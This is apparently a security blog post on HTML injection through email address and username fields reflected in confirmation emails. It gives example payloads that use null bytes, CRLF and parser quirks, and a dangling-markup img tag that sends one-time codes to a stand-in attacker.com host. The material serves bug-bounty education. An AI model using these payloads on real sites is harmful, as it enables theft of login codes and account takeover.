---
layout: post
title: "When email injection becomes a problem"
tags: [HTMLi, email]
---

Many websites take security seriously and use a lot of filters and sanitizers to prevent any sort of injection in common user-controlled fields, such as the username, address, etc. However, when it comes to emails, it looks like most developers don't even think that they can be exploited.

Portswigger has already written a mind-blowing [article](https://portswigger.net/research/splitting-the-email-atom), but because I have seen this issue myself in some bug bounty programs, I decided to give some personal examples. The following cases occur in web applications that send confirmation emails to their users, reflecting the user's input in the email body.

### The basic, harmless HTML injection

First of all, the assumption that an email address (or at least the email field from a web application) needs to have a standard format is wrong. Parsers are written to be broken. Many web applications accept emails in various formats, including metacharacters, unicode, etc. Some examples:

```
john.doe@example.com%00<img src="http://attacker.com/">
john.doe@example.com%0d%0a<img src="http://attacker.com/">
john.doe@example.com\u0000<img src="http://attacker.com/">
...
```

These look like invalid email addresses, but many parser simply stop at the first nullbyte or newline, sending the email to the user. If the email is contained within the HTML body of the sent email, the result is a harmless HTML injection.

More complicated patterns can be used to achieve the same result. For example, the following email address is considered valid by Python's `flask_mail`:

```python
>>> import email.utils
>>> email.utils.parseaddr('test<john.doe@example.com>test<h1>HTML Injection')
('test', 'john.doe@example.com')
```

This is possible because `flask_mail` parses the email address this way: If the `<` and `>` tags are present in the email, it will take the address between the tags as the recipient. Everything else is ignored.

### Not only emails

The same issue can occur with other user-controlled fields, such as the username. Many web applications allow users to change their username, and only sanitize their contents inside the web application. However, the emails sent as confirmation or notification (containing the username, which is user-controlled) are overlooked.

For example, a simple username like `john.doe <img src="http://attacker.com/">` can tamper with the email body, resulting in an HTML injection.

### The dangerous HTML injection

If the above cases seem to have no real impact, let's talk about a worse situation. Some websites send emails containing **confirmation codes**, **OTPS**, **email/password reset links**, etc. If these emails also contain user-controlled data in a way that allows HTML injection, the result can be disastruous. How? Using dangling markup. If the user's name/email is prepended to the OTP/Code, under certain (often rare) circumstances, the HTML tags can be closed, allowing for HTML injection along with full content exfiltration.

Such an example can be this email template:

```html
{% raw %}<p>Hi {{ username }}, here is your code: {{ code }}</p>{% endraw %}
```

With an injected username like `john.doe <img src="http://attacker.com/` (notice the unclosed `<img>` tag), the email body would become (depending on the browser):

```html
<p>Hi john.doe <img src="http://attacker.com/, here is your code: 123456</p>"></p>
```

This effectively results in OTP exfiltration, allowing the attacker to read the code and use it to gain access to the account.

### Conclusion

Even if email HTML injections do not have a high impact, they can still pose a serious risk if handled improperly. Fortuntely, web browsers and popular email clients have loads of protections in place to prevent such attacks. Dangling markup is now less and less of a problem in modern browsers. But, as such exploits have been possible in the past, the chances of them recurring are not zero. So keep these techniques in mind when hunting for bugs, who knows, you might find something interesting.

I have also created a CTF challenge involving the above attacks, you can find it [here](https://github.com/MateiBuzdea/phisher/). Give it a look!